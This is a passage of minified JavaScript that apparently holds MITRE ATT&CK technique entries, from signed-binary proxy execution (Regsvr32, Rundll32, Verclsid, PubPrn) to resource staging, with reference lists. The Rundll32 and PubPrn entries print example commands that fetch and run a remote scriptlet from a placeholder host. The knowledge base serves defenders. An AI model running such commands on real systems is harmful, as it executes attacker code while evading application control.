href='https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fbackdoor-carrying-emails-set-sights-on-russian-speaking-businesses\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fcobalt-spam-runs-use-macros-cve-2017-8759-exploit\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n";Eb.external_references=[{source_name:b,external_id:Ec,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F008"},{source_name:"Microsoft odbcconf.exe",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fsql\u002Fodbc\u002Fodbcconf-exe?view=sql-server-2017",description:"Microsoft. (2017, January 18). ODBCCONF.EXE. Retrieved March 7, 2019."},{source_name:"LOLBAS Odbcconf",url:"https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FOdbcconf\u002F",description:"LOLBAS. (n.d.). Odbcconf.exe. Retrieved March 7, 2019."},{source_name:"TrendMicro Squiblydoo Aug 2017",url:"https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fbackdoor-carrying-emails-set-sights-on-russian-speaking-businesses\u002F",description:"Bermejo, L., Giagone, R., Wu, R., and Yarochkin, F. (2017, August 7). Backdoor-carrying Emails Set Sights on Russian-speaking Businesses. Retrieved March 7, 2019."},{source_name:"TrendMicro Cobalt Group Nov 2017",url:"https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fcobalt-spam-runs-use-macros-cve-2017-8759-exploit\u002F",description:"Giagone, R., Bermejo, L., and Yarochkin, F. (2017, November 20). Cobalt Strikes Again: Spam Runs Use Macros and CVE-2017-8759 Exploit Against Russian Banks. Retrieved March 7, 2019."}];Eb["subtechnique-of"]=H;Ed.id=Ee;Ed["object-type"]=a;Ed.name="Regsvcs\u002FRegasm";Ed.description="Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F001'\u003EComponent Object Model\u003C\u002Fa\u003E (COM) assemblies. Both are digitally signed by Microsoft. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002F04za0hca.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Ftzat5yw6.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: \u003Ccode\u003E[ComRegisterFunction]\u003C\u002Fcode\u003E or \u003Ccode\u003E[ComUnregisterFunction]\u003C\u002Fcode\u003E respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. \u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FRegsvcs\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FRegasm\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Ed.external_references=[{source_name:b,external_id:Ee,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F009"},{source_name:"MSDN Regsvcs",description:"Microsoft. (n.d.). Regsvcs.exe (.NET Services Installation Tool). Retrieved July 1, 2016.",url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002F04za0hca.aspx"},{source_name:"MSDN Regasm",description:"Microsoft. (n.d.). Regasm.exe (Assembly Registration Tool). Retrieved July 1, 2016.",url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Ftzat5yw6.aspx"},{source_name:"LOLBAS Regsvcs",url:"https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FRegsvcs\u002F",description:"LOLBAS. (n.d.). Regsvcs.exe. Retrieved July 31, 2019."},{source_name:"LOLBAS Regasm",url:"https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FRegasm\u002F",description:"LOLBAS. (n.d.). Regasm.exe. Retrieved July 31, 2019."}];Ed["subtechnique-of"]=H;Ef.id=Eg;Ef["object-type"]=a;Ef.name="Regsvr32";Ef.description="Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.microsoft.com\u002Fen-us\u002Fkb\u002F249873'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. \u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FRegsvr32\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.carbonblack.com\u002F2016\u002F04\u002F28\u002Fthreat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F02\u002Fspear_phishing_techn.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F015'\u003EComponent Object Model Hijacking\u003C\u002Fa\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.carbonblack.com\u002F2016\u002F04\u002F28\u002Fthreat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Ef.external_references=[{source_name:b,external_id:Eg,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F010"},{source_name:"Microsoft Regsvr32",description:"Microsoft. (2015, August 14). How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.",url:"https:\u002F\u002Fsupport.microsoft.com\u002Fen-us\u002Fkb\u002F249873"},{source_name:"LOLBAS Regsvr32",url:"https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FRegsvr32\u002F",description:"LOLBAS. (n.d.). Regsvr32.exe. Retrieved July 31, 2019."},{source_name:"Carbon Black Squiblydoo Apr 2016",description:"Nolen, R. et al.. (2016, April 28). Threat Advisory: “Squiblydoo” Continues Trend of Attackers Using Native OS Tools to “Live off the Land”. Retrieved April 9, 2018.",url:"https:\u002F\u002Fwww.carbonblack.com\u002F2016\u002F04\u002F28\u002Fthreat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land\u002F"},{source_name:"FireEye Regsvr32 Targeting Mongolian Gov",description:"Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government. Retrieved February 24, 2017.",url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F02\u002Fspear_phishing_techn.html"}];Ef["subtechnique-of"]=H;Eh.id=Ei;Eh["object-type"]=a;Eh.name="Rundll32";Eh.description="Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1129'\u003EShared Modules\u003C\u002Fa\u003E), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\n\nRundll32.exe can also be used to execute \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F002'\u003EControl Panel\u003C\u002Fa\u003E Item files (.cpl) through the undocumented shell32.dll functions \u003Ccode\u003EControl_RunDLL\u003C\u002Fcode\u003E and \u003Ccode\u003EControl_RunDLLAsUser\u003C\u002Fcode\u003E. Double-clicking a .cpl file also causes rundll32.exe to execute. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.de\u002Fcloud-content\u002Fus\u002Fpdfs\u002Fsecurity-intelligence\u002Fwhite-papers\u002Fwp-cpl-malware.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: \u003Ccode\u003Erundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]\u002F\u002Fwww[.]example[.]com\u002Fmalicious.sct\")\"\u003C\u002Fcode\u003E  This behavior has been seen used by malware such as Poweliks. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fthisissecurity.stormshield.com\u002F2014\u002F08\u002F20\u002Fpoweliks-command-line-confusion\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Eh.external_references=[{source_name:b,external_id:Ei,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F011"},{source_name:"Trend Micro CPL",description:"Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.",url:DT},{source_name:"This is Security Command Line Confusion",description:"B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018.",url:"https:\u002F\u002Fthisissecurity.stormshield.com\u002F2014\u002F08\u002F20\u002Fpoweliks-command-line-confusion\u002F"}];Eh["subtechnique-of"]=H;Ej.id=Ek;Ej["object-type"]=a;Ej.name="Verclsid";Ej.description="Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.winosbite.com\u002Fverclsid-exe\u002F '\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running \u003Ccode\u003Everclsid.exe \u002FS \u002FC {CLSID}\u003C\u002Fcode\u003E, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F010'\u003ERegsvr32\u003C\u002Fa\u003E). Since it is signed and native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.\u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FVerclsid\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fredcanary.com\u002Fblog\u002Fverclsid-exe-threat-detection\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fbohops.com\u002F2018\u002F08\u002F18\u002Fabusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgist.github.com\u002FNickTyrer\u002F0598b60112eaafe6d07789f7964290d5'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ";Ej.external_references=[{source_name:b,external_id:Ek,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F012"},{source_name:"WinOSBite verclsid.exe",url:"https:\u002F\u002Fwww.winosbite.com\u002Fverclsid-exe\u002F ",description:"verclsid-exe. (2019, December 17). verclsid.exe File Information - What is it & How to Block . Retrieved August 10, 2020."},{source_name:"LOLBAS Verclsid",url:"https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FVerclsid\u002F",description:"LOLBAS. (n.d.). Verclsid.exe. Retrieved August 10, 2020."},{source_name:"Red Canary Verclsid.exe",url:"https:\u002F\u002Fredcanary.com\u002Fblog\u002Fverclsid-exe-threat-detection\u002F",description:"Haag, M., Levan, K. (2017, April 6). Old Phishing Attacks Deploy a New Methodology: Verclsid.exe. Retrieved August 10, 2020."},{source_name:"BOHOPS Abusing the COM Registry",url:"https:\u002F\u002Fbohops.com\u002F2018\u002F08\u002F18\u002Fabusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence\u002F",description:"BOHOPS. (2018, August 18). Abusing the COM Registry Structure (Part 2): Hijacking & Loading Techniques. Retrieved August 10, 2020."},{source_name:"Nick Tyrer GitHub",url:"https:\u002F\u002Fgist.github.com\u002FNickTyrer\u002F0598b60112eaafe6d07789f7964290d5",description:"Tyrer, N. (n.d.). Instructions. Retrieved August 10, 2020."}];Ej["subtechnique-of"]=H;El.id=Em;El["object-type"]=a;El.name="PubPrn";El.description="Adversaries may use the trusted PubPrn script to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application control solutions that do not account for use of these scripts.\n\n\u003Ccode\u003EPubPrn.vbs\u003C\u002Fcode\u003E is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2017\u002F08\u002F03\u002Fwsh-injection-a-case-study\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E An example command is \u003Ccode\u003Ecscript C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 script:http[:]\u002F\u002F192.168.1.100\u002Fhi.png\u003C\u002Fcode\u003E.";El.external_references=[{source_name:b,external_id:Em,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1216\u002F001"},{url:"https:\u002F\u002Fenigma0x3.net\u002F2017\u002F08\u002F03\u002Fwsh-injection-a-case-study\u002F",description:"Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.",source_name:"Enigma0x3 PubPrn Bypass"}];El["subtechnique-of"]=gs;Eo.id=Ep;Eo["object-type"]=a;Eo.name="Security Software Discovery";Eo.description="Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1518\u002F001'\u003ESecurity Software Discovery\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\u002For attempts specific actions.\n\nExample commands that can be used to obtain security software information are \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0108'\u003Enetsh\u003C\u002Fa\u003E, \u003Ccode\u003Ereg query\u003C\u002Fcode\u003E with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0075'\u003EReg\u003C\u002Fa\u003E, \u003Ccode\u003Edir\u003C\u002Fcode\u003E with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0057'\u003ETasklist\u003C\u002Fa\u003E, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fexpel.io\u002Fblog\u002Ffinding-evil-in-aws\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Eo.external_references=[{source_name:b,external_id:Ep,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1518\u002F001"},{external_id:"CAPEC-581",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F581.html"},{source_name:ci,url:cj,description:ck}];Eo["subtechnique-of"]=gt;EG.id=EH;EG["object-type"]=a;EG.name="Drive-by Target";EG.description="Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E. In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F001'\u003EApplication Access Token\u003C\u002Fa\u003E. Prior to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E, adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E) or previously compromised (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E).\n\nAdversaries may upload or inject malicious web content, such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F007'\u003EJavaScript\u003C\u002Fa\u003E, into websites.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2012\u002F12\u002Fcouncil-foreign-relations-water-hole-attack-details.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Farstechnica.com\u002Fsecurity\u002F2015\u002F08\u002Fnewly-discovered-chinese-hacking-group-hacked-100-websites-to-use-as-watering-holes\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This may be done in a number of ways, including inserting malicious script into web pages or other user controllable web content such as forum posts. Adversaries may also craft malicious web advertisements and purchase ad space on a website through legitimate ad providers. In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1592'\u003EGather Victim Host Information\u003C\u002Fa\u003E) to ensure it is vulnerable prior to attempting exploitation.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcybersecurity.att.com\u002Fblogs\u002Flabs-research\u002Fscanbox-a-reconnaissance-framework-used-on-watering-hole-attacks'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nWebsites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F001'\u003EDomains\u003C\u002Fa\u003E) to help facilitate \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E.";EG.external_references=[{source_name:b,external_id:EH,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1608\u002F004"},{source_name:d_,url:d$,description:ea},{source_name:Eu,description:Ev,url:Ew},{source_name:aw,url:ax,description:ay}];EG["subtechnique-of"]=aF;EI.id=EJ;EI["object-type"]=a;EI.name="Install Digital Certificate";EI.description="Adversaries may install SSL\u002FTLS certificates that can be used during targeting. SSL\u002FTLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.digicert.com\u002Fkb\u002Fssl-certificate-installation.htm'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may install SSL\u002FTLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1573\u002F002'\u003EAsymmetric Cryptography\u003C\u002Fa\u003E with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1071\u002F001'\u003EWeb Protocols\u003C\u002Fa\u003E) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. \n\nAdversaries can obtain digital certificates (see \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588\u002F004'\u003EDigital Certificates\u003C\u002Fa\u003E) or create self-signed certificates (see \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587\u002F003'\u003EDigital Certificates\u003C\u002Fa\u003E). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E) or previously compromised (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E).";EI.external_references=[{source_name:b,external_id:EJ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1608\u002F003"},{source_name:ED,url:EE,description:EF},{source_name:fj,url:fk,description:fl}];EI["subtechnique-of"]=aF;EK.id=EL;EK["object-type"]=a;EK.name="Link Target";EK.description="Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204\u002F001'\u003EMalicious Link\u003C\u002Fa\u003E. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598\u002F003'\u003ESpearphishing Link\u003C\u002Fa\u003E) or a phish to gain initial access to a system (as in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F002'\u003ESpearphishing Link\u003C\u002Fa\u003E), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F007'\u003EJavaScript\u003C\u002Fa\u003E to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598\u002F003'\u003ESpearphishing Link\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fmalwarebytes-news\u002F2020\u002F10\u002Fsilent-librarian-apt-phishing-attack\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.proofpoint.com\u002Fus\u002Fthreat-insight\u002Fpost\u002Fthreat-actor-profile-ta407-silent-librarian'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1608\u002F001'\u003EUpload Malware\u003C\u002Fa\u003E and have the link target point to malware for download\u002Fexecution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F001'\u003EDomains\u003C\u002Fa\u003E) to help facilitate \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204\u002F001'\u003EMalicious Link\u003C\u002Fa\u003E. Link shortening services can also be employed.";EK.external_references=[{source_name:b,external_id:EL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1608\u002F005"},{source_name:Ex,url:Ey,description:Ez},{source_name:EA,url:EB,description:EC}];EK["subtechnique-of"]=aF;EM.id=EN;EM["object-type"]=a;EM.name="Upload Malware";EM.description="Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1105'\u003EIngress Tool Transfer\u003C\u002Fa\u003E by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased\u002Frented by the adversary (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E) or was otherwise compromised by them (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E). Malware can also be staged on web services, such as GitHub or Pastebin.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2020\u002F11\u002F06\u002Foceanlotus-extending-cyber-espionage-operations-through-fake-websites\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download\u002Finstall these backdoored files via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204'\u003EUser Execution\u003C\u002Fa\u003E. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036'\u003EMasquerading\u003C\u002Fa\u003E may increase the chance of users mistakenly executing these files.";EM.external_references=[{source_name:b,external_id:EN,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1608\u002F001"},{source_name:Er,url:Es,description:Et}];EM["subtechnique-of"]=aF;EO.id=EP;EO["object-type"]=a;EO.name="Upload Tool";EO.description="Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0029'\u003EPsExec\u003C\u002Fa\u003E). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1105'\u003EIngress Tool Transfer\u003C\u002Fa\u003E by placing it on an Internet accessible web server.\n\nTools may be placed on infrastructure that was previously purchased\u002Frented by the adversary (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E) or was otherwise compromised by them (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.secureworks.com\u002Fresearch\u002Fthreat-group-3390-targets-organizations-for-cyberespionage'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Tools can also be staged on web services, such as an adversary controlled GitHub repo.\n\nAdversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.";EO.external_references=[{source_name:b,external_id:EP,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1608\u002F002"},{source_name:"Dell TG-3390",description:"Dell SecureWorks Counter Threat Unit Threat Intelligence. (2015, August 5). Threat Group-3390 Targets Organizations for Cyberespionage. Retrieved August 18, 2018.",url:"https:\u002F\u002Fwww.secureworks.com\u002Fresearch\u002Fthreat-group-3390-targets-organizations-for-cyberespionage"}];EO["subtechnique-of"]=aF;Fa.id=Fb;Fa["object-type"]=a;Fa.name="AS-REP Roasting";Fa.description="Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110\u002F002'\u003EPassword Cracking\u003C\u002Fa\u003E Kerberos messages.\u003Csup\u003E\u003Ca 